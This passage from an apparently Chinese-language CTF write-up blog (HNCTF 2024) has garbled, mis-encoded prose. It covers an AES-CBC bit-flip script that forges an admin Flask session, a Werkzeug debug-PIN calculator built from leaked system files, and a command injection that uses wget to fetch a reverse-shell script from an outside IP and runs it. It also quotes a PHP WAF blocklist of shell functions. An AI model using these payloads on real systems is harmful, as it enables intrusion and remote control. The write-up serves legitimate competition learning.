class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æœ‰ç‚¹éš¾ç»·ï¼Œç»™äººä¸€ç§æ˜¯å¯†ç æ‰‹å‡ºçš„å¯†ç é¢˜çš„æ„Ÿè§‰ã€‚<br>ä»¥ä¸ºæ²¡ä»€ä¹ˆå¯†ç åŸºç¡€ï¼Œæˆ‘ç›´æ¥å¡åœ¨äº†ç¬¬ä¸€æ­¥ï¼Œæ€ä¹ˆä¼ªé€ sessionã€‚åæ¥åœ¨æ°´ç¾¤çš„æ—¶å€™å‡ºé¢˜äººè¯´è¯¥é¢˜ç›®æ€è·¯æ¥è‡ªäºè€å¤–ï¼Œäºæ˜¯æˆ‘å°±åœ¨ç½‘ä¸ŠæŸ¥èƒ½ä¸èƒ½æ‰¾åˆ°ç±»ä¼¼çš„sessionä¼ªé€ æ–¹æ³•ï¼Œç»“æœå°±è®©æˆ‘æŸ¥åˆ°äº†(tamuctf)[<a href="https://github.com/tamuctf/tamuctf-2024/tree/master/web/flipped">https://github.com/tamuctf/tamuctf-2024/tree/master/web/flipped</a>]<br>å‘ç°å…¶ä¸ºASE CBCåŠ å¯†çš„ç¿»è½¬æ”»å‡»ã€‚ ã€‚ã€‚ã€‚è¿™ä¸æ˜¯å¯†ç æ˜¯ä»€ä¹ˆ<br>æˆ‘ç›´æ¥æŠŠwpçš„è„šæœ¬æ”¹äº†ä¸€ä¸‹å°±ç›´æ¥ç”¨äº†<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># iv</span></span><br><span class="line"><span class="comment"># &#123;&quot;admin&quot;: 0, &quot;us</span></span><br><span class="line"><span class="comment"># ername&quot;: &quot;guest&quot;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(<span class="string">&quot;eeAq7MHva/ci36jjUfDoG7QuxPZ1ZNCS0QZrCMAUoMRZAIMDu2YVwO2pVB/d/IVkczV8PNLAVjNI3MghDv/pew==&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(cipher))</span><br><span class="line"></span><br><span class="line">array_cipher = <span class="built_in">bytearray</span>(cipher)</span><br><span class="line">iv = array_cipher[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"></span><br><span class="line">decode_plain = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸå§‹æ˜æ–‡</span></span><br><span class="line">plain = <span class="string">&#x27;&#123;&quot;admin&quot;: 1, &quot;us&#x27;</span></span><br><span class="line"></span><br><span class="line">newiv = <span class="built_in">list</span>(iv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">    newiv[i] = (<span class="built_in">ord</span>(plain[i].encode(<span class="string">&#x27;utf-8&#x27;</span>)) ^ iv[i] ^ <span class="built_in">ord</span>(decode_plain[i].encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">newiv = <span class="built_in">bytes</span>(newiv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;newiv:&#x27;</span>, base64.b64encode(newiv + cipher[<span class="number">16</span>:]))</span><br></pre></td></tr></table></figure><br>ç»è¿‡è¿™æ ·å¤„ç†çš„sessionè§£å¯†å¤„ç†çš„adminå°±æ˜¯1äº†ã€‚<br>ä¹‹åå°±æ˜¯è¯»å–æ–‡ä»¶æ¥è®¡ç®—pinå€¼äº†<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctfUser&#x27;</span>  <span class="comment"># username å¯é€šè¿‡/etc/passwdè·å–</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modnameé»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># é»˜è®¤å€¼ getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span>  <span class="comment"># è·¯å¾„ å¯æŠ¥é”™å¾—åˆ°  getattr(mod, &#x27;__file__&#x27;, None)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;191387107621224&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address macåœ°å€åè¿›åˆ¶</span></span><br><span class="line">    <span class="string">&quot;d8c226fb-ceb1-4366-ad71-e8e995dc3065fdb2ec0912d863176b2644451101612d45cb5275f4233b89a916779f4f089ce3&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å­—ç¬¦ä¸²åˆå¹¶ï¼š1./etc/machine-id(dockerä¸ç”¨çœ‹) /proc/sys/kernel/random/boot_idï¼Œæœ‰boot-idé‚£å°±æ‹¼æ¥boot-id 2. /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><br>è¯»å–å…¶ä»–æ–‡ä»¶æ—¶æ²¡æœ‰é‡åˆ°ä»€ä¹ˆæƒ…å†µï¼Œä½†æ˜¯å½“è¯»å–machine-idæ˜¯é‡åˆ°äº†wafã€‚æˆ‘å°è¯•ä½¿ç”¨unicodeæ¥å°è¯•ç»•è¿‡å‘ç°ç»•ä¸è¿‡å»ã€‚<br>è™½ç„¶æˆ‘ä»¬æ— æ³•è¯»å–/proc/self/cgroupä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨1æ¥ä»£æ›¿selfï¼Œè€Œ/proc/self/mountinfoå’Œ/proc/self/cpusetéƒ½æœ‰/proc/self/cgroupçš„å†…å®¹ã€‚p<br>è¿™é¢˜æˆ‘ä»¬ä½¿ç”¨/proc/1/cpusetæ¥ä»£æ›¿/proc/self/cgroupï¼Œä¹‹åå°±æ˜¯è®¡ç®—pinè¿›è¡Œrceã€‚</p><h1 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h1><img src="/2024/05/13/hnctf-wp/ezflask.png" class="" title="alt text"><p>é¢˜ç›®ç›´æ¥å°†åç«¯è¯­å¥å‘Šè¯‰äº†æˆ‘ä»¬ï¼Œä½†æ˜¯åªè¦ä¸€æ¬¡æ‰§è¡Œçš„æœºä¼šï¼Œä½†æ˜¯å…¶flagåªæœ‰å½“å…¶æ‰§è¡Œä¸€æ¬¡å‘½ä»¤åæ‰ä¼šç”Ÿæˆã€‚å³æˆ‘ä»¬è¦æ‰§è¡Œä¸¤æ¬¡ï¼Œä¸€å¼€å§‹æˆ‘ç›´æ¥åƒåˆ°äº†å¼¹ä¸ªshellä¸å°±å¥½äº†ã€‚äºæ˜¯æˆ‘ç›´æ¥å°è¯•å¼¹shellã€‚ä½†æ˜¯å…¶åå°ç¦äº†å¾ˆå¤šå¯¼è‡´æ— æ³•å¼¹shellã€‚<br>è¿™æ—¶å€™æˆ‘åˆæƒ³åˆ°è¿™é“é¢˜ç›®æœ‰pythonç¯å¢ƒé‚£ä¹ˆæˆ‘ç›´æ¥è¿œç¨‹ä¸‹è½½ä¸€ä¸ªå¯ä»¥åå¼¹shellçš„pythonè„šæœ¬åœ¨æ‰§è¡Œä¸å°±å¥½äº†<br>äºæ˜¯æˆ‘ç”¨kaliç”Ÿæˆäº†ä¸€ä¸ªåå¼¹shellçš„pythonè„šæœ¬<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><br>ç„¶åæŒ‚åœ¨åœ¨vpsä¸Š<br>ä¼ å€¼<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=__import__(&quot;os&quot;).popen(&quot;wget 111.230.38.159:8000/shell.py -O /tmp/shell.py;chmod 777 /tmp/shell.py;/tmp/shell.py&quot;).read()</span><br></pre></td></tr></table></figure><br>æˆåŠŸåå¼¹shell<br>ä¹‹åå†åˆ·æ–°ä¸€ä¸‹å°±å¯ä»¥è¯»å–flagäº†</p><h1 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h1><p>è¿™é¢˜è€ƒçš„æ˜¯thinkphpçš„ä»£å®¡,å®¡è®¡éš¾åº¦å…¶å®ä¸ç®—å¤ªä½ï¼Œä½†æ˜¯å…¶logæ³„éœ²äº†ï¼Œé‚£éš¾åº¦å°±ç›´çº¿ä¸‹é™äº†<br>æ‰“å¼€æºç å‘ç°å…¶ç‰ˆæœ¬ä¸º3.2.3åœ¨ç½‘ä¸Šæœä¸€ä¸‹å‘ç°å…¶å­˜åœ¨sqlæ³¨å…¥æ¼æ´<br>åœ¨å…¨å±€æœç´¢<code>è£…èµ·æ¥äº†</code>å¯ä»¥æ‰¾åˆ°webé¡µé¢çš„æºç <br><img src="/2024/05/13/hnctf-wp/ez_tp2.png" class="" title="alt text"><br>æˆ‘ä»¬æŸ¥çœ‹h_nå‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">h_n</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;getallheaders&#x27;</span>)) &#123;</span><br><span class="line">                <span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&#x27;HTTP_&#x27;</span>) <span class="variable">$headers</span>[<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="title function_ invoke__">ucwords</span>(<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">5</span>))))) ] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$get</span> = <span class="variable">$_GET</span>;</span><br><span class="line">            <span class="variable">$post</span> = <span class="variable">$_POST</span>;</span><br><span class="line">            <span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>;</span><br><span class="line">            <span class="variable">$header</span> = <span class="title function_ invoke__">getallheaders</span>();</span><br><span class="line">            <span class="variable">$files</span> = <span class="variable">$_FILES</span>;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line">            <span class="variable">$filepath</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>];</span><br><span class="line">            <span class="comment">//rewirte shell which uploaded by others, you can do more</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$files</span>[<span class="variable">$key</span>][<span class="string">&#x27;content&#x27;</span>] = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;virink&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$header</span>[<span class="string">&#x27;Accept&#x27;</span>]); <span class="comment">//fix a bug</span></span><br><span class="line">            <span class="variable">$input</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;Get&quot;</span> =&gt; <span class="variable">$get</span>,</span><br><span class="line">                <span class="string">&quot;Post&quot;</span> =&gt; <span class="variable">$post</span>,</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span> =&gt; <span class="variable">$cookie</span>,</span><br><span class="line">                <span class="string">&quot;File&quot;</span> =&gt; <span class="variable">$files</span>,</span><br><span class="line">                <span class="string">&quot;Header&quot;</span> =&gt; <span class="variable">$header</span></span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//deal with</span></span><br><span class="line">            <span class="variable">$pattern</span> = <span class="string">&quot;insert| |delete|and|or|\/\*|\*|\.\.\/|\.\/|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;</span><br><span class="line">            <span class="variable">$pattern</span>.= <span class="string">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line">            <span class="variable">$pattern</span>.= <span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line">            <span class="variable">$pattern</span>.= <span class="string">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;</span><br><span class="line">            <span class="variable">$vpattern</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$pattern</span>);</span><br><span class="line">            <span class="variable">$bool</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$v</span> <span class="keyword">as</span> <span class="variable">$kk</span> =&gt; <span class="variable">$vv</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$vv</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$bool</span>) <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$bool</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$bool</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.name&#x27;</span>);</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">waf</span>())&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;username,age&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$name</span>))-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">var_export</span>(<span class="variable">$ret</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä»¥ä¸ºå…¶æ–‡ä»¶è¢«å®šä¹‰ä¸º<br>namespace Home\Controller;<br>use Think\Controller;<br>æ‰€ä»¥æˆ‘ä»¬é€šè¿‡/index.php/Home/Index/h_næ¥è®¿é—®h_nå‡½æ•°ã€‚<br>æŸ¥çœ‹h_nå‡½æ•°å‘ç°ä¸»è¦çš„æ¼æ´éƒ¨åˆ†æ˜¯å¦‚ä¸‹çš„éƒ¨åˆ†<br><img src="image-3.png" alt="alt text"><br>è¿™æ—¶å€™æˆ‘åœ¨å…¨å±€æœç´¢äº†ä¸€ä¸‹ç½‘ä¸Šçš„payloadç»“æœè®©æˆ‘å‘ç°äº†ï¼Œå‡ºé¢˜äººçš„logæ²¡åˆ ï¼Œç›´æ¥ä¸€ä»¶payloadäº†<br><img src="/2024/05/13/hnctf-wp/3.png" class=""><br>åœ¨å†™è¿™é“é¢˜ç›®çš„wpæ—¶æˆ‘æœ‰å°è¯•è‡ªå·±å®¡è®¡ä¸€éï¼Œç»“æœæˆ‘å‘ç°æˆ‘çš„åŠ¨è°ƒç¯å¢ƒæ²¡æœ‰æå¥½ï¼Œæˆ‘å‡†å¤‡æœ‰æ—¶é—´æä¸€æï¼Œçœ‹äº†ä¸€ä¸‹å‡ºé¢˜äººçš„payloadï¼Œè¯´å®è¯æ²¡ææ‡‚ä¸ºä»€ä¹ˆè¦é‚£ä¹ˆé—­åˆï¼Œè¿˜æ˜¯å¾—å­¦ä¹ å•Šã€‚</p><h1 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h1><p>è¿™é¢˜èŠ±äº†å‡ ä¸ªå°æ—¶æ¥å®¡è®¡ç»“æœç«Ÿç„¶ï¼Œä¸‹çº¿äº†ï¼Œæ‚²<br>è¿™é¢˜å­˜åœ¨æºç æ³„éœ²www.zip<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;algorithm.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$login</span> = <span class="keyword">new</span> <span class="title class_">Users</span>(<span class="variable">$username</span>, <span class="variable">$passwd</span>,<span class="string">&quot;True&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encryptCookie</span>(<span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>)))), <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 